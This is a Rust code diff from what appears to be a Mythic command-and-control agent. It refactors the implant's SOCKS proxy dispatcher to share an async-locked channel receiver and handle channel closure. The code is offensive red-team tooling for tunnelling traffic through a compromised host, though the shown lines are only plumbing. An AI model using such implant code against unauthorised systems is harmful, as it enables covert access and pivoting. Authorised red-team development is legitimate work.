@@ -10,7 +10,7 @@ use std::sync::mpsc as std_mpsc;
 use std::sync::Mutex;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
-use tokio::sync::mpsc as tokio_mpsc;
+use tokio::sync::{mpsc as tokio_mpsc, Mutex as AsyncMutex};
 use tokio::time::{timeout, Duration};
 use tokio_util::sync::CancellationToken;
 use once_cell::sync::Lazy;
@@ -24,19 +24,35 @@ struct AgentTask {
     parameters: Option<String>,
 }
 
-// Global channels and token for SOCKS integration across check-ins
-static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(|| {
-    tokio_mpsc::unbounded_channel::<Value>().0
+// -------- Global state (channels + cancel token) --------
+
+struct SocksIn {
+    tx: tokio_mpsc::UnboundedSender<Value>,
+    rx: AsyncMutex<tokio_mpsc::UnboundedReceiver<Value>>,
+}
+
+static SOCKS_IN: Lazy<SocksIn> = Lazy::new(|| {
+    let (tx, rx) = tokio_mpsc::unbounded_channel::<Value>();
+    SocksIn { tx, rx: AsyncMutex::new(rx) }
 });
+
+// Backward-compatible alias so existing code that uses SOCKS_IN_TX.send(...) still works.
+static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(|| SOCKS_IN.tx.clone());
+
 static SOCKS_OUT: Lazy<Arc<Mutex<Vec<Value>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
 static SOCKS_CANCEL: Lazy<CancellationToken> = Lazy::new(CancellationToken::new);
+
+// Optional helper for callers
+#[inline]
+pub fn socks_in_send(v: Value) -> Result<(), tokio_mpsc::error::SendError<Value>> {
+    SOCKS_IN.tx.send(v)
+}
 
 /* -------------------------- Debug helpers -------------------------- */
 
 fn debug_to_mythic(task_id: &str, title: impl Into<String>, detail: impl Into<String>) {
-    // Integrate with agent's output queue; for now, print or log
     println!("{}: {}: {}", task_id, title.into(), detail.into());
-    // TODO: Send to mythic response
+    // TODO: integrate with Mythic response pipeline
 }
 
 fn hex_preview(data: &[u8], max: usize) -> String {
@@ -350,16 +366,25 @@ pub fn start_socks_dispatcher(task_id: String) {
 
         debug_to_mythic(&task_id, "socks.dispatcher.run", "awaiting items");
 
+        // This task owns the receiver while it runs.
+        let mut rx_guard = SOCKS_IN.rx.lock().await;
+
         loop {
             tokio::select! {
-                Some(item) = SOCKS_IN_TX.recv() => {
+                maybe = rx_guard.recv() => {
+                    let Some(item) = maybe else {
+                        debug_to_mythic(&task_id, "socks.dispatcher.rx_closed", "channel closed");
+                        break;
+                    };
+
                     seen += 1;
                     let sid = item["server_id"].as_str().unwrap_or("").to_string();
                     let exit = item["exit"].as_bool().unwrap_or(false);
                     let data_len_b64 = item["data"].as_str().map(|s| s.len()).unwrap_or(0);
 
                     if seen <= 5 || seen % 100 == 0 {
-                        debug_to_mythic(&task_id, "socks.dispatcher.item", format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64));
+                        debug_to_mythic(&task_id, "socks.dispatcher.item",
+                            format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64));
                     }
 
                     let entry = sessions.entry(sid.clone()).or_insert_with(|| {
